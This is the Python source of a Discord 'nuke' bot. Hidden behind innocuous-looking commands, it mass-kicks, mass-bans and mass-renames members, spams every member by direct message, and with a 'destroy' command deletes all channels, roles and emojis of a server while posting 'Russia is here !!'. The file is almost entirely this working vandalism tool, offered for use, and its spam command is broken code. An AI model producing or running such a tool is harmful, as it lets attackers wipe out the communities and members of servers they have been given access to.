####################################################

# This code is not mine 100% i got it somewhere "i forgot" but i did some changes on it :3

###################################################
import discord
from discord.ext import commands
from discord.ext.commands import Bot
from config import BOT_TOKEN, prefix
import asyncio
import random
intents = discord.Intents(messages=True, guilds=True, members=True)
# Imports the needed libs.

client = commands.Bot(command_prefix=prefix, intents=intents)
# Sets prefix and intents

client.remove_command("help")

@client.event
async def on_ready():
    print ("SpyroHB Was here ._.")

@client.event
async def on_server_join(server):
    print("Joining {0}".format(server.name))
#############################

####KALL COMMAND####
@client.command(pass_context=True)
async def kall(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(client.get_all_members()):
        try:
            await guild.kick(member)
            print (f"{member.name} has been kicked")
        except:
            print (f"{member.name} has failed to be kicked")
        print ("Kicked all")
#############################

####BALL COMMAND####
@client.command(pass_context=True)
async def ball(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(client.get_all_members()):
        try:
            await guild.ban(member)
            print ("User " + member.name + " has been banned")
        except:
            pass
    print ("Banned all")
#############################

####RALL COMMAND####
@client.command(pass_context=True)
async def rall(ctx, rename_to):
    await ctx.message.delete()
    for member in list(client.get_all_members()):
        try:
            await member.edit(nick=rename_to)
            print (f"{member.name} has been renamed to {rename_to}")
        except:
            print (f"{member.name} failed to be renamed")
        print("Renamed all")
#############################

####MALL COMMAND####
@client.command(pass_context=True)
async def mall(ctx):
    listzz = [
        'Deez nuts',
        'nuts deez',
        'totally random i swear',
        'sorry guys last time xd'
    ]
    await ctx.message.delete()
    for member in list(client.get_all_members()):
        await asyncio.sleep(0)
        try:
            for listi in listzz:
                x = random.shuffle(listi)
                await member.send(x)
        except:
            pass
        print("sent Message to all")
#############################

###DESTROY COMMAND####
@client.command(pass_context=True)
async def destroy(ctx):
    await ctx.message.delete()
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print (channel.name + " has been deleted")
        except:
            pass
        guild = ctx.message.guild
        channel = await guild.create_text_channel("AURA!!!")
        await channel.send("Russia is here !!")
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print (f"{role.name} has been deleted")
        except:
            pass
    for member in list(client.get_all_members()):
        try:
            await guild.ban(member)
            print ("User " + member.name + " has been banned")
        except:
            pass
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print (f"{emoji.name} has been deleted")
        except:
            pass    
    print("Nuked dem !!")
#############################

#############################

####INFO COMMAND####
@client.command(pass_context=True)
async def info(ctx, member: discord.Member=None):
    await ctx.message.delete()
    member = ctx.message.author
    channel = ctx.message.channel
    if member is None:
        pass
    else:
        embed=discord.Embed(title=None, description="**The user's name is: {}**".format(member.name) + "\n**The user's ID is: {}**".format(member.id) + "\n**The user's current status is: {}**".format(member.status) + "\n**The user's highest role is: {}**".format(member.top_role) + "\n**The user joined at: {}**".format(member.joined_at))
        await channel.send(embed=embed)
    print("Operation Done !")



#############################

client.run(BOT_TOKEN)